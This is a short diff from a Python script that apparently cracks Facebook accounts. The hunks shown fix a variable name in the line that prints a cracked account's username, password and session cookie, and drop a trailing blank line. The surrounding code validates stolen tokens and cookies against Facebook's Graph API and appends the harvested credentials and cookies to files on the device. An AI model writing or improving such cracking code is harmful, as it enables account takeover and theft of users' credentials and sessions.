@@ -907,7 +907,7 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {coki} {VV} 			   ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
@@ -1858,4 +1858,3 @@ def cutrs():
 if __name__ == '__main__':
     os.system('git pull')
 crack().plerr()
-
